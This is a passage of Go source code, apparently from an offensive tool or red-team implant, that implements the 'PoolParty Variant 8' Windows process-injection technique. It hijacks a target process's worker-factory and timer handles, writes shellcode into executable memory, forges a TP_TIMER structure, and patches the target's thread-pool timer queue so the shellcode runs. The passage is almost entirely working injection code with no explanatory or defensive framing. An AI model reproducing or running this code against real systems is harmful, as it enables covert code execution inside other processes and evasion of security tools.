	output += fmt.Sprintf("[+] Hijacked timer queue handle: 0x%X\n", hTimer)

	// Step 4: Query worker factory to get TP_POOL address
	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
	var returnLength uint32
	status, _, _ := procNtQueryInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryBasicInformation),
		uintptr(unsafe.Pointer(&workerFactoryInfo)),
		uintptr(unsafe.Sizeof(workerFactoryInfo)),
		uintptr(unsafe.Pointer(&returnLength)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Worker factory start parameter (TP_POOL): 0x%X\n", workerFactoryInfo.StartParameter)

	// Step 5: Allocate and write shellcode to target process
	shellcodeAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if shellcodeAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)

	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		shellcodeAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)

	// Step 6: Create TP_TIMER structure via CreateThreadpoolTimer
	pTpTimer, _, err := procCreateThreadpoolTimer.Call(
		shellcodeAddr, // Timer callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if pTpTimer == 0 {
		return output, fmt.Errorf("CreateThreadpoolTimer failed: %v", err)
	}
	output += "[+] Created TP_TIMER structure associated with shellcode\n"

	// Step 7: Allocate memory for TP_TIMER in target process first (we need the address for linkage)
	var tpTimer FULL_TP_TIMER
	
	tpTimerAddr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(unsafe.Sizeof(tpTimer)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if tpTimerAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for TP_TIMER failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_TIMER memory at: 0x%X\n", tpTimerAddr)

	// Step 8: Copy the TP_TIMER structure (CreateThreadpoolTimer may return protected memory)
	for i := 0; i < int(unsafe.Sizeof(tpTimer)); i++ {
		*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&tpTimer)) + uintptr(i))) =
			*(*byte)(unsafe.Pointer(pTpTimer + uintptr(i)))
	}

	// Step 9: Modify TP_TIMER structure for insertion
	const timeout int64 = -10000000 // 1 second in 100-nanosecond intervals (negative = relative)

	// Set Pool pointer to target's TP_POOL
	tpTimer.Work.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
	
	// CRITICAL: Manually set the Callback - CreateThreadpoolTimer doesn't set this field
	tpTimer.Work.CleanupGroupMember.Callback = shellcodeAddr

	// Set timer expiration
	tpTimer.DueTime = timeout
	tpTimer.WindowStartLinks.Key = timeout
	tpTimer.WindowEndLinks.Key = timeout

	// Set up circular lists for WindowStart and WindowEnd Children and Siblings
	// Calculate remote addresses for the Window*Links fields
	remoteWindowStartChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks)) + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks.Children))
	remoteWindowEndChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks)) + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks.Children))
	remoteWindowStartSiblingsAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks)) + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks.Siblings))
	remoteWindowEndSiblingsAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks)) + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks.Siblings))

	tpTimer.WindowStartLinks.Children.Flink = remoteWindowStartChildrenAddr
	tpTimer.WindowStartLinks.Children.Blink = remoteWindowStartChildrenAddr
	tpTimer.WindowStartLinks.Siblings.Flink = remoteWindowStartSiblingsAddr
	tpTimer.WindowStartLinks.Siblings.Blink = remoteWindowStartSiblingsAddr
	
	tpTimer.WindowEndLinks.Children.Flink = remoteWindowEndChildrenAddr
	tpTimer.WindowEndLinks.Children.Blink = remoteWindowEndChildrenAddr
	tpTimer.WindowEndLinks.Siblings.Flink = remoteWindowEndSiblingsAddr
	tpTimer.WindowEndLinks.Siblings.Blink = remoteWindowEndSiblingsAddr

	output += "[+] Modified TP_TIMER structure for insertion\n"
	output += fmt.Sprintf("[*] Debug: Callback address in structure = 0x%X (expected shellcode at 0x%X)\n", tpTimer.Work.CleanupGroupMember.Callback, shellcodeAddr)
	output += fmt.Sprintf("[*] Debug: Pool address in structure = 0x%X (expected 0x%X)\n", tpTimer.Work.CleanupGroupMember.Pool, workerFactoryInfo.StartParameter)

	// Step 10: Write TP_TIMER to target process
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		tpTimerAddr,
		uintptr(unsafe.Pointer(&tpTimer)),
		uintptr(unsafe.Sizeof(tpTimer)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for TP_TIMER failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_TIMER structure (%d bytes)\n", bytesWritten)

	// Step 11: Calculate addresses for WindowStart and WindowEnd roots in target TP_POOL
	
	// Step 12: Update TP_POOL's TimerQueue WindowStart and WindowEnd roots to point to our timer
	// SafeBreach writes to pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root
	
	targetTpPoolAddr := workerFactoryInfo.StartParameter
	
	// Calculate offsets step by step - Go doesn't handle nested offsetof well
	var dummyPool FULL_TP_POOL
	var dummyTimerQueue TPP_TIMER_QUEUE
	var dummySubQueue TPP_TIMER_SUBQUEUE
	
	timerQueueOffset := uintptr(unsafe.Offsetof(dummyPool.TimerQueue))
	absoluteQueueOffset := uintptr(unsafe.Offsetof(dummyTimerQueue.AbsoluteQueue))
	windowStartOffset := uintptr(unsafe.Offsetof(dummySubQueue.WindowStart))
	windowEndOffset := uintptr(unsafe.Offsetof(dummySubQueue.WindowEnd))
	
	// WindowStart.Root and WindowEnd.Root - Root is first field of TPP_PH so offset is 0
	windowStartRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowStartOffset
	windowEndRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowEndOffset

	// Calculate address of our timer's WindowStartLinks and WindowEndLinks
	remoteWindowStartLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks))
	remoteWindowEndLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks))

	output += fmt.Sprintf("[*] Debug: targetTpPoolAddr = 0x%X\n", targetTpPoolAddr)
	output += fmt.Sprintf("[*] Debug: timerQueueOffset = 0x%X, absoluteQueueOffset = 0x%X\n", timerQueueOffset, absoluteQueueOffset)
	output += fmt.Sprintf("[*] Debug: windowStartOffset = 0x%X, windowEndOffset = 0x%X\n", windowStartOffset, windowEndOffset)
	output += fmt.Sprintf("[*] Debug: windowStartRootAddr = 0x%X\n", windowStartRootAddr)
	output += fmt.Sprintf("[*] Debug: windowEndRootAddr = 0x%X\n", windowEndRootAddr)
	output += fmt.Sprintf("[*] Debug: remoteWindowStartLinksAddr = 0x%X\n", remoteWindowStartLinksAddr)
	output += fmt.Sprintf("[*] Debug: remoteWindowEndLinksAddr = 0x%X\n", remoteWindowEndLinksAddr)

	// Write WindowStartLinks address to WindowStart.Root
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		windowStartRootAddr,
		uintptr(unsafe.Pointer(&remoteWindowStartLinksAddr)),
		uintptr(unsafe.Sizeof(remoteWindowStartLinksAddr)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for WindowStart.Root failed: %v", err)
	}

	// Write WindowEndLinks address to WindowEnd.Root
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(hProcess),
		windowEndRootAddr,
		uintptr(unsafe.Pointer(&remoteWindowEndLinksAddr)),
		uintptr(unsafe.Sizeof(remoteWindowEndLinksAddr)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for WindowEnd.Root failed: %v", err)
	}
	output += "[+] Modified target process's TP_POOL timer queue to point to TP_TIMER\n"

	// Step 13: Set the timer to expire via NtSetTimer2
	var dueTime int64
	dueTime = timeout

	var params T2_SET_PARAMETERS
	status, _, _ = procNtSetTimer2.Call(
		uintptr(hTimer),
		uintptr(unsafe.Pointer(&dueTime)),
		0, // Period
		uintptr(unsafe.Pointer(&params)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtSetTimer2 failed: 0x%X", status)
	}
	output += "[+] Set timer to expire and trigger TppTimerQueueExpiration\n"
	output += "[+] PoolParty Variant 8 injection completed successfully\n"

	return output, nil
}

// hijackProcessHandle enumerates handles in target process and duplicates one of the specified type
func hijackProcessHandle(hProcess windows.Handle, objectType string, desiredAccess uint32) (windows.Handle, error) {
	const STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
	const maxRetries = 5

	// Start with a reasonable initial buffer size and retry with increasing sizes
	var buffer []byte
	var returnLength uint32
	bufferSize := uint32(64 * 1024) // Start with 64KB

	var status uintptr
	for i := 0; i < maxRetries; i++ {
		buffer = make([]byte, bufferSize)
		status, _, _ = procNtQueryInformationProcess.Call(
			uintptr(hProcess),
			uintptr(ProcessHandleInformation),
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(bufferSize),
			uintptr(unsafe.Pointer(&returnLength)),
		)

		if status == 0 {
			break // Success
		}

		if status == STATUS_INFO_LENGTH_MISMATCH {
			// Double the buffer size for next attempt, or use returnLength if provided
			if returnLength > bufferSize {
				bufferSize = returnLength + 4096
			} else {
				bufferSize *= 2
			}
			continue
		}

		// Some other error
		return 0, fmt.Errorf("NtQueryInformationProcess failed: 0x%X", status)
	}

	if status != 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess failed after %d retries: 0x%X (buffer size: %d)", maxRetries, status, bufferSize)
	}

	// Parse handle information
	handleInfo := (*PROCESS_HANDLE_SNAPSHOT_INFORMATION)(unsafe.Pointer(&buffer[0]))
	handleEntrySize := unsafe.Sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO{})
	handleArrayOffset := unsafe.Sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION{})

	// Iterate through handles
	for i := uintptr(0); i < uintptr(handleInfo.NumberOfHandles); i++ {
		entryOffset := handleArrayOffset + (i * handleEntrySize)
		if entryOffset+handleEntrySize > uintptr(len(buffer)) {
			break
		}

		entry := (*PROCESS_HANDLE_TABLE_ENTRY_INFO)(unsafe.Pointer(&buffer[entryOffset]))

		// Try to duplicate the handle
		var duplicatedHandle windows.Handle
		err := windows.DuplicateHandle(
			hProcess,
			entry.HandleValue,
			windows.CurrentProcess(),
			&duplicatedHandle,
			desiredAccess,
			false,
			0,
		)
		if err != nil {
			continue
		}

		// Query the object type
		typeName, err := getObjectTypeName(duplicatedHandle)
		if err != nil {
			windows.CloseHandle(duplicatedHandle)
			continue
		}

		if typeName == objectType {
			return duplicatedHandle, nil
		}

		windows.CloseHandle(duplicatedHandle)
	}

	return 0, fmt.Errorf("failed to find handle of type: %s", objectType)
}

// getObjectTypeName queries the type name of an object handle
func getObjectTypeName(handle windows.Handle) (string, error) {
	// First call to get required buffer size
	var returnLength uint32
	procNtQueryObject.Call(
		uintptr(handle),
		uintptr(ObjectTypeInformation),
		0,
		0,
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if returnLength == 0 {
		returnLength = 256
	}

	buffer := make([]byte, returnLength)
	status, _, _ := procNtQueryObject.Call(
		uintptr(handle),
		uintptr(ObjectTypeInformation),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(returnLength),
		uintptr(unsafe.Pointer(&returnLength)),
	)
	if status != 0 {
		return "", fmt.Errorf("NtQueryObject failed: 0x%X", status)
	}

	// Parse PUBLIC_OBJECT_TYPE_INFORMATION
	typeInfo := (*PUBLIC_OBJECT_TYPE_INFORMATION)(unsafe.Pointer(&buffer[0]))

	// Convert UNICODE_STRING to Go string
	if typeInfo.TypeName.Buffer == nil || typeInfo.TypeName.Length == 0 {
		return "", fmt.Errorf("empty type name")
	}

	typeName := windows.UTF16PtrToString(typeInfo.TypeName.Buffer)
	return typeName, nil
}
